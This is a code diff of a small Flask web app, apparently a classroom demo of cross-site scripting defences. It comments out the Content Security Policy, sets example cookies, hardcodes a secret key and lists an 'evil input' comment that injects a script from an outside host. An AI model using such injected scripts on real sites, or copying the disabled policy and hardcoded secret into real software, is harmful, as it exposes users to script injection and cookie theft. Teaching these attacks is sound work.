@@ -6,12 +6,12 @@ from flask_talisman import Talisman
 app = Flask(__name__)
 
 # Defense 3: use Talisman framework
-csp = {
-    'script-src': "https://maxcdn.bootstrapcdn.com/ https://code.jquery.com/ https://cdnjs.cloudflare.com/",
-    'style-src': "https://maxcdn.bootstrapcdn.com/",
-    'default-src': "'self'",
-}
-talisman = Talisman(app, content_security_policy=csp)
+#csp = {
+#    'script-src': "https://maxcdn.bootstrapcdn.com/ https://code.jquery.com/ https://cdnjs.cloudflare.com/",
+#    'style-src': "https://maxcdn.bootstrapcdn.com/",
+#    'default-src': "'self'",
+#}
+#talisman = Talisman(app, content_security_policy=csp)
 
 # Omdat er formulieren gebruikt worden is een geheime sleutel nodig -> wordt gebruikt om een digital signature van de cookies te genereren
 app.config['SECRET_KEY'] = 'mijn geheime sleutel'
@@ -29,7 +29,7 @@ def index():
         session['comment'] = form.comment.data
     response = make_response(render_template('home.html', form=form))
     response.set_cookie('userID', '1234') # Example ultra-secret cookie (1)
-    response.set_cookie('userEmail', 'henk.de.beuker@bonknet.nl') # Example ultra-secret cookie (2)
+    response.set_cookie('userEmail', 'henk.de.beuker@hanze.nl') # Example ultra-secret cookie (2)
 
     # Evil input 1: remote script execution
     # <script src="https://www.erikroos.org/hanze/ssec.js"></script>
